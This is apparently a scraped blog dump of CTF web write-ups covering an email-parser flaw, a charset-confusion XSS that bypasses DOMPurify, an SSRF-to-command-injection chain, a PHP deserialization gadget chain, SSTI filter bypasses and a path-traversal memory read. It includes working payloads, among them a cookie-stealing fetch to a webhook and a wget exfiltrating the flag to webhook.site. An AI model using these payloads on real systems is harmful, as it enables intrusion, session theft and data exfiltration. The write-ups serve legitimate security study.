\u0026#39;;\u0026#39;, // Semicolons are not a legal delimiter per the RFC2822 grammar other // than for terminating a group, but they are also not valid for any // other use in this context. Given that some mail clients have // historically allowed the semicolon as a delimiter equivalent to the // comma in their UI, it makes sense to treat them the same as a comma // when used outside of a group. \u0026#39;;\u0026#39;: \u0026#39;\u0026#39; }; } /** * Tokenizes the original input string * * @return {Array} An array of operator|text tokens */ tokenize() { let list = []; for (let i = 0, len = this.str.length; i \u0026lt; len; i++) { let chr = this.str.charAt(i); let nextChr = i \u0026lt; len - 1 ? this.str.charAt(i + 1) : null; this.checkChar(chr, nextChr); } this.list.forEach(node =\u0026gt; { node.value = (node.value || \u0026#39;\u0026#39;).toString().trim(); if (node.value) { list.push(node); } }); return list; } /** * Checks if a character is an operator or text and acts accordingly * * @param {String} chr Character from the address field */ checkChar(chr, nextChr) { if (this.escaped) { // ignore next condition blocks } else if (chr === this.operatorExpecting) { this.node = { type: \u0026#39;operator\u0026#39;, value: chr }; if (nextChr \u0026amp;\u0026amp; ![\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;;\u0026#39;].includes(nextChr)) { this.node.noBreak = true; } this.list.push(this.node); this.node = null; this.operatorExpecting = \u0026#39;\u0026#39;; this.escaped = false; return; } else if (!this.operatorExpecting \u0026amp;\u0026amp; chr in this.operators) { this.node = { type: \u0026#39;operator\u0026#39;, value: chr }; this.list.push(this.node); this.node = null; this.operatorExpecting = this.operators[chr]; this.escaped = false; return; } else if ([\u0026#39;\u0026#34;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;].includes(this.operatorExpecting) \u0026amp;\u0026amp; chr === \u0026#39;\\\\\u0026#39;) { this.escaped = true; return; } if (!this.node) { this.node = { type: \u0026#39;text\u0026#39;, value: \u0026#39;\u0026#39; }; this.list.push(this.node); } if (chr === \u0026#39;\\n\u0026#39;) { // Convert newlines to spaces. Carriage return is ignored as \\r and \\n usually // go together anyway and there already is a WS for \\n. Lone \\r means something is fishy. chr = \u0026#39; \u0026#39;; } if (chr.charCodeAt(0) \u0026gt;= 0x21 || [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;].includes(chr)) { // skip command bytes this.node.value += chr; } this.escaped = false; } } It splits our data into an token array :\nIt will split the \u0026quot; as a operator and our text is just text :v. Then put this token through _handleAddress function. The logic is really simple and comment makes it readable. function _handleAddress(tokens) { let isGroup = false; let state = \u0026#39;text\u0026#39;; let address; let addresses = []; let data = { address: [], comment: [], group: [], text: [] }; let i; let len; // Filter out \u0026lt;addresses\u0026gt;, (comments) and regular text for (i = 0, len = tokens.length; i \u0026lt; len; i++) { let token = tokens[i]; let prevToken = i ? tokens[i - 1] : null; if (token.type === \u0026#39;operator\u0026#39;) { switch (token.value) { case \u0026#39;\u0026lt;\u0026#39;: state = \u0026#39;address\u0026#39;; break; case \u0026#39;(\u0026#39;: state = \u0026#39;comment\u0026#39;; break; case \u0026#39;:\u0026#39;: state = \u0026#39;group\u0026#39;; isGroup = true; break; default: state = \u0026#39;text\u0026#39;; break; } } else if (token.value) { if (state === \u0026#39;address\u0026#39;) { // handle use case where unquoted name includes a \u0026#34;\u0026lt;\u0026#34; // Apple Mail truncates everything between an unexpected \u0026lt; and an address // and so will we token.value = token.value.replace(/^[^\u0026lt;]*\u0026lt;\\s*/, \u0026#39;\u0026#39;); } if (prevToken \u0026amp;\u0026amp; prevToken.noBreak \u0026amp;\u0026amp; data[state].length) { // join values data[state][data[state].length - 1] += token.value; } else { data[state].push(token.value); } } } // If there is no text but a comment, replace the two if (!data.text.length \u0026amp;\u0026amp; data.comment.length) { data.text = data.comment; data.comment = []; } if (isGroup) { // http://tools.ietf.org/html/rfc2822#appendix-A.1.3 data.text = data.text.join(\u0026#39; \u0026#39;); addresses.push({ name: data.text || (address \u0026amp;\u0026amp; address.name), group: data.group.length ? addressparser(data.group.join(\u0026#39;,\u0026#39;)) : [] }); } else { // If no address was found, try to detect one from regular text if (!data.address.length \u0026amp;\u0026amp; data.text.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { if (data.text[i].match(/^[^@\\s]+@[^@\\s]+$/)) { data.address = data.text.splice(i, 1); break; } } let _regexHandler = function (address) { if (!data.address.length) { data.address = [address.trim()]; return \u0026#39; \u0026#39;; } else { return address; } }; // still no address if (!data.address.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { // fixed the regex to parse email address correctly when email address has more than one @ data.text[i] = data.text[i].replace(/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/, _regexHandler).trim(); if (data.address.length) { break; } } } } // If there\u0026#39;s still is no text but a comment exixts, replace the two if (!data.text.length \u0026amp;\u0026amp; data.comment.length) { data.text = data.comment; data.comment = []; } // Keep only the first address occurence, push others to regular text if (data.address.length \u0026gt; 1) { data.text = data.text.concat(data.address.splice(1)); } // Join values with spaces data.text = data.text.join(\u0026#39; \u0026#39;); data.address = data.address.join(\u0026#39; \u0026#39;); if (!data.address \u0026amp;\u0026amp; isGroup) { return []; } else { address = { address: data.address || data.text || \u0026#39;\u0026#39;, name: data.text || data.address || \u0026#39;\u0026#39; }; if (address.address === address.name) { if ((address.address || \u0026#39;\u0026#39;).match(/@/)) { address.name = \u0026#39;\u0026#39;; } else { address.address = \u0026#39;\u0026#39;; } } addresses.push(address); } } return addresses; } I will explain this : STEP 1: It create a data object to store all infomations we have. let data = { address: [], comment: [], group: [], text: [] }; Step2 : Read the token and read the type of it to set the stage and decide where the following data pushed into the data list.\nfor (i = 0, len = tokens.length; i \u0026lt; len; i++) { let token = tokens[i]; let prevToken = i ? tokens[i - 1] : null; if (token.type === \u0026#39;operator\u0026#39;) { switch (token.value) { case \u0026#39;\u0026lt;\u0026#39;: state = \u0026#39;address\u0026#39;; break; case \u0026#39;(\u0026#39;: state = \u0026#39;comment\u0026#39;; break; case \u0026#39;:\u0026#39;: state = \u0026#39;group\u0026#39;; isGroup = true; break; default: state = \u0026#39;text\u0026#39;; break; } You can see it just check the \u0026ldquo;\u0026lt;\u0026rdquo; at first to decide which one is address so our data wont be caught here!. Then is some uninteresting features. Until this :\n// If no address was found, try to detect one from regular text // This will run because we dont use \u0026lt; \u0026gt; format if (!data.address.length \u0026amp;\u0026amp; data.text.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { if (data.text[i].match(/^[^@\\s]+@[^@\\s]+$/)) { data.address = data.text.splice(i, 1); break; } } let _regexHandler = function (address) { if (!data.address.length) { data.address = [address.trim()]; return \u0026#39; \u0026#39;; } else { return address; } }; // still no address // Here we step into this if (!data.address.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { // fixed the regex to parse email address correctly when email address has more than one @ data.text[i] = data.text[i].replace(/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/, _regexHandler).trim(); if (data.address.length) { break; } } } Author comments make me know what to do here. If there isn\u0026rsquo;t the address parsed, It will use regrex to find our email. First regrex is : for (i = data.text.length - 1; i \u0026gt;= 0; i--) { if (data.text[i].match(/^[^@\\s]+@[^@\\s]+$/)) { data.address = data.text.splice(i, 1); break; } } Then test it : You can see that it just read the first pattern match email. This is the reason why our payload works !!!! The last try will check the final regrex is : data.text[i] = data.text[i].replace(/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/, _regexHandler).trim(); It will find the pattern and call the callback which will push that pattern into the address !!!!\nLET\u0026rsquo;S ANSWER THE QUESTIONS # The difference between ?\nemail :\u0026#39; \u0026#34;test@email.htb\u0026#34; @interstellar.htb\u0026#39; But this wont work ( JUST A SPACE )\nemail :\u0026#39; \u0026#34;test@email.htb\u0026#34;@interstellar.htb\u0026#39; When tokenized it will be something different :\nYou see it right ? The noBreak makes the second one cannot work. It will be set by this logic :\nif (nextChr \u0026amp;\u0026amp; ![\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;;\u0026#39;].includes(nextChr)) { this.node.noBreak = true; } When noBreak is enabled, it wont push our text token into array, but it will JOIN with the previous value. if (prevToken \u0026amp;\u0026amp; prevToken.noBreak \u0026amp;\u0026amp; data[state].length) { // join values data[state][data[state].length - 1] += token.value; } else { data[state].push(token.value); } And leads to the wrong email detected !! Conclusion # I learned alot from this challenge, and read this makes me can understand more how the payloads created. :vvv ","date":"27 August 2024","externalUrl":null,"permalink":"/posts/htb/","section":"Posts","summary":"Write ups HTB UNIVERSITY # Web armaxis # Logic is only thing\nOverview : # We are given a page and a email host to receive OTP. Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.\nrouter.post(\u0026#34;/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; // Added \u0026#39;email\u0026#39; parameter if (!","title":"Hack The Box University 2024","type":"posts"},{"content":" Sushi Search # Read this before : Blog\nType: Xss through missing charset\nChromium detect engine This is really hard to me , and i just can solve after reading script :v SOURCE CODE : # This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss. But \u0026hellip;. :::danger They sanitize it with DomPurify at newest version ! ::: Pay attention in this code : It doesnt specify an charset which lead to vulnerabilities. Which leads to the wrong encoding heres of sushi emoji. But i read this blog and i found a way to bypass. If we can someway to fool chrome engine to detect the charset as ISO_2022_JP, we can bypass easily with. /search?search= \u0026lt;a id=\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1B(B \u0026lt;a id=\u0026#34;\u0026gt;\u0026lt;img src=x onerror = fetch(`YOUR-WEB-HOOK?a=document.cookie`)\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1b$B %1b(B \u0026lt;repeat 1000 times\u0026gt; I cannot explain better the blog so read it :vvv .This is a valid DOM and dompurify wont sanitize this and then chrome parse it as ISO_2022_JP BOOOOOOOOOOOOOOOOOOOOOOM We get xss :) HARDEST THING # THE HARDEDST QUESTION IS HOW CHROME DETECT IT ? # Maybe you can just put a lot of bunchs of %1b$B and %1b(B and hope chrome detect it :vv There is something weird here when i try my exploit # /search?search= \u0026lt;a id=\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1B(B \u0026lt;a id=\u0026#34;\u0026gt;\u0026lt;img src=x onerror = alert(1) \u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;%1b$B %1b(B \u0026lt;repeat 10000 times\u0026gt; /search?search= \u0026lt;a id=\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1B(B \u0026lt;a id=\u0026#34;\u0026gt;\u0026lt;img src=x onerror = alert(1111111111111111111111111)\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;%1b$B %1b(B \u0026lt;repeat 10000 times\u0026gt; Both of codes is just different at the length of alert right ? ====== But (1) not works :vv ====== And (2) give me this -\u0026gt; chrome detect success ??\nIt took me one day confusing and I decide to read chromium source code (in fact shin24 tells me :vv)\nCHROME DETECT ENGINE # It is too long to tell how the engine works but i will tell a little bit :::warning I just tell the way i understand because of so many blackbox. ::: Its like a game of bunch encodings. Anyone has their own scores. Boost and Whack scores is main feature and the best will be chosen one. SLOW SCAN ( Which detects the ISO_2022_JP ) # It will scan 16KB of document and if it doesn\u0026rsquo;t find any encodings, it will fast scan (256kb) which we dont talk about .\nSlow can will check only the interesting byte \u0026lt; 0x80 and 0x1b is in that case.\nHere is the scan_table it use to detect if that byte it interesting or not. (!=0 -\u0026gt; interesting)\nSo if it meets a interesting byte. First it will check if that bytes is inside a or or comment. If inside a title tag , it will be decreased the score it can boost, then skip to the end of tag just in case there is 12 bytes in title already. Pay attention that in our case my input actually push into the title tag too. However, there is something funny here when reading more the logic check tag It loops back 192 bytes to find the \u0026ldquo;\u0026lt;\u0026rdquo; and \u0026ldquo;\u0026gt;\u0026rdquo; . Yeah like i say \u0026ldquo;192\u0026rdquo; bytes. So if you pad a bunch of \u0026ldquo;a\u0026rdquo; before your \u0026ldquo;%1b\u0026rdquo; , it won\u0026rsquo;t be considered inside a title tag and they wont be skipped to tag end + keep full score weightshift !!!\nIt seems the reason why exploit 2 works . Now let\u0026rsquo;s dive deeper\nANOTHER QUESTION # BUT why we want to keep a bunch of data in title ? When we can place it here ? Is it scored the same ???? The fact is NO! # In short, one scan just check 8 pairs of interesting bytes then pruning. If something get pruned , it is done and no get checked any more!!! And we dont want this If the number of pairs is not divided by 8 , no boostPrune will happend Max pairs scanned === 48 pairs SO what is matter ? # The KEY IS THAT SUSHI !! That emoji in bytes is 0xF0 0xF8 0x8a 0xa3 (take 4 bytes) And if we look at the logic to boost\nLogic to whack BOOST a little and WHACK SO MUCH ! :vv First i think it not matter because 0xF0 is bigger than 0x1F right ? But when i try to debug, it happens, the 0xF0 is \u0026lt; 0x1F and it whack our score so much!! *I still dont make sense maybe because of signed number :v SO the emoji whacking us too much !!! ===\u0026raquo;\u0026gt; If we put data after sushi , there is no way to continue checking ISO due to pruned\nMATH TIMEEEE # In case we have 7 pair boost and 1 pair whack from sushi emoji BoostGentle = 60 WhackBadPair = 600 Score = BOOST - WHACK = 7*60 - 600 = -180 points So we dont want to have any emoji get scanned pairs !! \u0026mdash;\u0026gt; If we set at title , it will get enough pairs before getting the sushi emoji Conclusion # That is the reason we want to trim out the sushi emoji. And we need the assistance of title tag. This challenge is really hard :vv MORE # I test in locally and it works with append a bunch of \u0026ldquo;a\u0026rdquo; and 8 pairs of \u0026ldquo;\\x1b$B\\x1b(B\u0026rdquo; so i hope its true :vv\nv WELL WELL TEST KNOWLEDGE # If you understand you will know what happen if i put this sushi in another place @@ \u0026mdash;\u0026gt; It will be ISO_2022_JP :vvv\n","date":"27 August 2024","externalUrl":null,"permalink":"/posts/sushi/","section":"Posts","summary":"Sushi Search # Read this before : Blog\nType: Xss through missing charset\nChromium detect engine This is really hard to me , and i just can solve after reading script :v SOURCE CODE : # This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss. But \u0026hellip;. :::danger They sanitize it with DomPurify at newest version !","title":"Sushi Search and Chrome Detect Engine","type":"posts"},{"content":" Write ups WannaGame # Dox List: # Source code : # CVE-2024-42352: https://nvd.nist.gov/vuln/detail/CVE-2024-42352\nServer :\n@app.route(\u0026#39;/health_check\u0026#39;) def health_check(): cmd = request.args.get(\u0026#39;cmd\u0026#39;) or \u0026#39;ping\u0026#39; health_check = f\u0026#39;echo \\\u0026#39;db.runCommand(\u0026#34;{cmd}\u0026#34;).ok\\\u0026#39; | mongosh mongodb:27017/app --quiet\u0026#39; try: result = subprocess.run(health_check, shell=True, capture_output=True, text=True, timeout=2) app.logger.info(result) return \u0026#39;Database is responding\u0026#39; if \u0026#39;1\u0026#39; in result.stdout else \u0026#39;Database is not responding\u0026#39; except subprocess.TimeoutExpired: return \u0026#39;Database is not responding\u0026#39; @app.route(\u0026#39;/api/dogs\u0026#39;) def get_dogs(): app.logger.info(f\u0026#34;Requests Header : {request.headers}\u0026#34;) dogs = [] for dog in app_db[\u0026#39;doxlist\u0026#39;].find(): dogs.append({ \u0026#34;name\u0026#34;: dog[\u0026#39;name\u0026#39;], \u0026#34;image\u0026#34;: dog[\u0026#39;image\u0026#39;] }) return jsonify(dogs) We have two routes, one for get data from db and one to call a command with subprocess.run. Because it is running with : shell = True so we can use something like : cat /flag* to receive the flag and call to our web hooks.\nClient :\n\u0026lt;script setup\u0026gt; import { ref, onMounted } from \u0026#39;vue\u0026#39;; const delay = ms =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)) const cards = ref(new Array(8)) const { data, error } = await useAsyncData(\u0026#39;fetchDox\u0026#39;, async () =\u0026gt; { try { const response = await $fetch(\u0026#39;http://backend:5000/api/dogs\u0026#39;) console.log(response) return response } catch (err) { console.error(\u0026#39;Error fetching data:\u0026#39;, err) return cards; } }) onMounted(async () =\u0026gt; { console.log(data) if (data) cards.value = data.value; console.log(cards) }); Well it looks like server just call to the the \u0026ldquo;/api/dogs\u0026rdquo;\u0026hellip; Im trying to figure out some way to ssrf this app and its too hard. So we have a hint from authors So now , we just need to find a CVE which we can just check version of packages in our app.\n\u0026#34;dependencies\u0026#34;: { \u0026#34;@nuxt/icon\u0026#34;: \u0026#34;1.4.4\u0026#34;, \u0026#34;@nuxtjs/proxy\u0026#34;: \u0026#34;^2.1.0\u0026#34;, \u0026#34;nuxt\u0026#34;: \u0026#34;^3.13.0\u0026#34;, \u0026#34;vue\u0026#34;: \u0026#34;latest\u0026#34;, \u0026#34;vue-router\u0026#34;: \u0026#34;latest\u0026#34; }, Ye , there is only one unupdated is @nuxt/icon. Search on google and we will find this. And we try to test this on our app. Now we can call to the route right ??? Nope, its seem impossible\nLook at the implementation of url parse we can know the reason why. Our url will be catched with the basename \u0026ldquo;/\u0026rdquo; and then i tried some bypass with \u0026ldquo;\u0026quot; and \u0026ldquo;%5C\u0026rdquo; but it is impossilbe so we need to find another way. Take a breathe, and we can control the place our server will redirect to right ? So the idea is really simple !!! Make it redirect to our own app !!! And we can just redirect it back to its route (\u0026quot;/health_check\u0026rdquo;) Implement own server # from flask import Flask,request,redirect import requests app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return redirect(\u0026#34;http://backend:5000/health_check?cmd=%22%29%27%3Bwget%20https%3A%2F%2Fwebhook.site%2F8e85705e-3468-4e1f-90b5-745c2a70b808%3Fq%3D%24%28cat%20%2Fflag%2A%29%20%3Becho%20%271%27%3B%23%20\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) # This runs the app locally Host this app up and we will receive the flag at our webhook !! Im sorry for not showing the real flag because I dont know why i cannot access it anymore :\u0026lt;.\nMy Restaurant # Insecure Deserialization\nOverview # class Spaghetti { public $sauce; public $noodles; public $portion; public function __get($tomato) { ($this-\u0026gt;sauce)(); } } class Pizza { public $price; public $cheese; public $size; public function __destruct() { echo $this-\u0026gt;size-\u0026gt;what; } } \u0026lt;?php class IceCream { public $flavors; public $topping; public function __invoke() { foreach ($this-\u0026gt;flavors as $flavor) { echo $flavor; } } } This challenge gives us 3 class and this is 100% a PHP deserialization challenge !! So we need to find some ways to chain these vulnerabilities. I rearranged for easier explanation.\nFirst class is Spaghetti use method __get($tomato) is a method get called when we get access into a undefined attribute of that class. And it will run the function at sauce Second class is Pizza use method __destruct is a method get called when this class is destructed. Then it will call to the $size-\u0026gt;what. Final class IceCream use method __invoke is a method get called when get called like $ice();. It will loops and print the flavors array. What we can chain here ? # Look at the Pizza, it will access to an undefined variables what right? So if we set our $size is a object of Spaghetti which has __get($tomato) get called when access to undefined attribute ? We can chain these together then we can run the $sauce of Spaghetti. What the $sauce should be ? It is clear is the IceCream !!! And it will run the __invoke and print its flavors !!! What flavors we want ? # So now we can make some chain, to finally run the __invoke to print out all flavors. Well a $flavors in IceCream is just an array and in the source code we have something interesting : \u0026lt;?php namespace Helpers{ use \\ArrayIterator; class ArrayHelpers extends ArrayIterator { public $callback; public function current() { $value = parent::current(); echo $value; $debug = call_user_func($this-\u0026gt;callback, $value); return $value; } } } This creates a Helpers Array which add a function when get looped with forEach. It will loop through the values in array and call a callback with argument is that value !!!! Which is so suitable to create our $flavours right ? Because the $flavours get looped too !!.\nforeach ($this-\u0026gt;flavors as $flavor) { echo $flavor; } Full steps : # $pizza = new Pizza(); $spa = new Spaghetti(); $ice = new IceCream(); //Set the values is a malicous code $arrayHel = new ArrayHelpers([\u0026#34;cat /*.txt\u0026#34;]); // Set callback to system function to exec code $arrayHel-\u0026gt;callback=\u0026#34;system\u0026#34;; // Chain methods $ice-\u0026gt;flavors = $arrayHel; $spa-\u0026gt;sauce = $ice; $pizza-\u0026gt;size = $spa; echo serialize($pizza); echo base64_encode(serialize($pizza)); Test it on burp suite we get : Hmmm it seems not get the ArrayHelpers instance because this class comes from another file. Just fix a little bit with : Run again and get the flag !!!! SSTI FOR KIDS : # def check_payload(payload): forbidden_chars = [\u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;x\u0026#34;, \u0026#34;dict\u0026#34;, \u0026#34;config\u0026#34;, \u0026#34;mro\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;debug\u0026#34;, \u0026#34;cycler\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;flag\u0026#34;, \u0026#34;cat\u0026#34;] # [] , payload = payload.lower() for char in forbidden_chars: if char in payload: print(f\u0026#34;CAUGHT {char}\u0026#34;) return True return False This challenge need us to bypass SSTI checker. After reading this blog\nI found a powerful payload : {{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;id\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} But it stills get caught with x letter so just convert all of them into octal form :\u0026raquo;\n{{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\137\\137globals\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137builtins\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137import\\137\\137\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;id\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} Then change some blackwords too: Final :\n{{request|attr(\u0026#39;\\141pplic\\141ti\\157n\u0026#39;)|attr(\u0026#39;\\137\\137glob\\141ls\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137builtins\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137imp\\157rt\\137\\137\u0026#39;)(\u0026#39;\\157s\u0026#39;)|attr(\u0026#39;p\\157pen\u0026#39;)(\u0026#39;c\\141t fl\\141g*\u0026#39;)|attr(\u0026#39;re\\141d\u0026#39;)()}} Ten ten ten: Nemo # Logic and read memories\nSource Back End: # class FileMetadata: def __init__( self, author, filename, description, id = None, ): if len(author) \u0026gt; 50 or \\ len(filename) \u0026gt; 50 or \\ len(description) \u0026gt; 150: raise StringTooLongException() self.creation_time = datetime.now(tz=timezone.utc) self.author = author self.filename = filename self.init = id in forbidden_ids basedir = \u0026#34;/company\u0026#34; if self.init else \u0026#34;/tmp\u0026#34; self.path = f\u0026#34;{basedir}/{filename}\u0026#34; self.description = description self.id = str(UUID(id, version=4)) if id is not None else str(uuid4()) def write(self, collection, content): raise ValueError(\u0026#34;Use of forbidden id\u0026#34;) collection.insert_one(vars(self)) if \u0026#34;./\u0026#34; in self.path: raise PathTraversalAttemptDetectedException() if len(content) \u0026gt; 200: raise FileTooBigException() with open(self.path, \u0026#34;w\u0026#34;) as f: f.write(content) def read(self, offset, length): with open(self.path, \u0026#34;rb\u0026#34;) as f: f.seek(offset) return f.read(length) First it wil create a FileMeta with 2 main functions:\nWrite and Read There are also some rules need to follow. First it will check the id given and check if it is forbiddened or not. After that choose a basedir to store that file (\u0026rsquo;/tmp\u0026rsquo; or \u0026lsquo;/company\u0026rsquo;). Finally initialize a uuid if no id given and check the format of id given. Pay attention that read function using offset and length to read a file which looks too weird. Well it looks too much information here. But left it and read at the server code . Source Handle : # def initialize_db(): for f in files: m = f[\u0026#34;metadata\u0026#34;] fm = FileMetadata( m[\u0026#34;author\u0026#34;], m[\u0026#34;filename\u0026#34;], m[\u0026#34;description\u0026#34;], id = m[\u0026#34;id\u0026#34;], ) if not metadata.find_one({\u0026#34;id\u0026#34;: m[\u0026#34;id\u0026#34;]}): fm.write(metadata, f[\u0026#34;content\u0026#34;]) print(files[-1][\u0026#34;metadata\u0026#34;][\u0026#34;filename\u0026#34;]) if (os.path.exists(\u0026#34;init/init_data.py\u0026#34;)): os.remove(\u0026#34;init/init_data.py\u0026#34;) First it will generate files with data from a pathname init/init_data.py and then delete those file. And the flag is one of those get deleted.\n{ \u0026#34;metadata\u0026#34;: { \u0026#34;author\u0026#34;: \u0026#34;Shimmering Pearl\u0026#34;, \u0026#34;filename\u0026#34;: \u0026#34;ocean_whispers.txt\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The eternal song of the waves.\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;3dad5070-950c-48c5-bbb2-51312d4a8eab\u0026#34;, }, \u0026#34;content\u0026#34;: FLAG, }, Then we have 2 routes handle for read file:\n@app.get(\u0026#34;/files\u0026#34;) def get_files(): return [f[\u0026#34;metadata\u0026#34;] for f in files] @app.get(\u0026#34;/files/\u0026lt;id\u0026gt;\u0026#34;) def get_file(id): if id == \u0026#34;3dad5070-950c-48c5-bbb2-51312d4a8eab\u0026#34;: return \u0026#34;\u0026#34;, 403 res = metadata.find_one({ \u0026#34;id\u0026#34;: {\u0026#34;$eq\u0026#34;: id} }) if res is None: return \u0026#34;\u0026#34;, 404 m = FileMetadata( res[\u0026#34;author\u0026#34;], res[\u0026#34;filename\u0026#34;], res[\u0026#34;description\u0026#34;], id=res[\u0026#34;id\u0026#34;], ) if files[-1][\u0026#34;metadata\u0026#34;][\u0026#34;filename\u0026#34;] in res[\u0026#34;filename\u0026#34;]: return \u0026#34;\u0026#34;, 403 ######## read offset voi length chi v?????????????############## return m.read(int(request.args.get(\u0026#34;offset\u0026#34;, 0)), int(request.args.get(\u0026#34;length\u0026#34;, -1))) We can read any files with the id but not the id of the flag as well as the file has the same name of the flag file. Then is the route to handle uploading files :\ndef parse_file(body, id=None): import re, string ##### VI SAO PHAI CHECK PRINTABLE ####### CONTENT_CHECK = re.compile(f\u0026#34;[^ {string.printable}]\u0026#34;) if CONTENT_CHECK.search(body[\u0026#34;content\u0026#34;]): raise () if len(body[\u0026#34;content\u0026#34;]) \u0026gt; 200: raise ValueError() return { \u0026#34;metadata\u0026#34;: FileMetadata( body[\u0026#34;author\u0026#34;], body[\u0026#34;filename\u0026#34;], body[\u0026#34;description\u0026#34;], id, ), \u0026#34;content\u0026#34;: body[\u0026#34;content\u0026#34;] } @app.post(\u0026#34;/files\u0026#34;) def post_file(): body = request.json try: parsed_body = parse_file(body) except (KeyError, ValueError): return \u0026#34;\u0026#34;, 422 m = parsed_body[\u0026#34;metadata\u0026#34;] content = parsed_body[\u0026#34;content\u0026#34;] m.write(metadata, content) r = make_response(\u0026#34;\u0026#34;, 201) # KO CHECK PATH TRAVERSAL r.headers[\u0026#34;Location\u0026#34;] = f\u0026#34;/api/v1/files/{m.id}\u0026#34; return r @app.put(\u0026#34;/files/\u0026lt;id\u0026gt;\u0026#34;) def put_file(id): if id in forbidden_ids: return \u0026#34;\u0026#34;, 403 body = request.json try: parsed_body = parse_file(body, id) except (KeyError, ValueError): return \u0026#34;\u0026#34;, 422 m = parsed_body[\u0026#34;metadata\u0026#34;] content = parsed_body[\u0026#34;content\u0026#34;] m.write(metadata, content) r = make_response(\u0026#34;\u0026#34;, 201) # KO CHECK PATH TRAVERSAL r.headers[\u0026#34;Location\u0026#34;] = f\u0026#34;/api/v1/files/{m.id}\u0026#34; return r First is the function parse_file which will receive the body data and id to use that and create a FileMeta Data. Post and Put file function is just different that the Put you can handle id passed into parse_file which the Post doesn\u0026rsquo;t. But it seems the PUT get checked the forbidden_ids too much. Specially 3 times :vv. My silly ideas: # The first time, i have though about how can i abuse the id which seems a dead end but I want to talk about it a little bit. :v My idea is simple that I want to create a file with the same id of flag file although I dont have idea why does it :v and as it takes me long time with no results.\nBut i found something weird at the : self.id = str(UUID(id, version=4)) if id is not None else str(uuid4()) And when test it , i found this :\nHEy , HEY it get changed at letter A into 4\nAfter researching , I found that at that byte position used to specify the version in variant RFC 4122 UUID. So the implementation try to convert that bytes into the version number . Maybe this can be used to bypass in some challenges :DDD Continue : # SO it seems id is not our playground anymore :v. What can happen here ?\nAfter reading too long.. I feel like there is a flaw in the logic code def write(self, collection, content): if self.id in forbidden_ids and not self.init: raise ValueError(\u0026#34;Use of forbidden id\u0026#34;) collection.insert_one(vars(self)) ## INSERT VAO LUON ROI =)))))) if \u0026#34;./\u0026#34; in self.path: raise PathTraversalAttemptDetectedException() if len(content) \u0026gt; 200: raise FileTooBigException() with open(self.path, \u0026#34;w\u0026#34;) as f: f.write(content) It just check the id and then insert straight into the model =)))) So we dont actually care about the filename get checked by path traversal. As well as the read just need a filename and nothing mores :vvv. def read(self, offset, length): # Write duoc 1 filename co filename la path traversal -\u0026gt; lay id -\u0026gt; bo vao ham get -\u0026gt; READ EVERYTHING with open(self.path, \u0026#34;rb\u0026#34;) as f: f.seek(offset) return f.read(length) \u0026hellip; As well as the routes handling.\nNew ideas: # So what if I create a malicous filename to every file I want and then read that id ? I will receive the data from that file:DD.\nNow let\u0026rsquo;s try read /etc/passwd with these steps . It will be error because of geting caught by path traversal but I dont care :\u0026gt;\nThen read with our id !! Read what to get the flag ? # Well it seems the file is deleted by the python and not anymore. But it actually still lives in memory. And in linux to debug the memories we need to read at /proc/self/mem. Because it is a virtual file , it means it is created at the time we read it so to read it we need an offset and length, now we know the reason of them in read function ~~ How to find an offset # Ye, we have a friends called /proc/self/maps which will list all memory 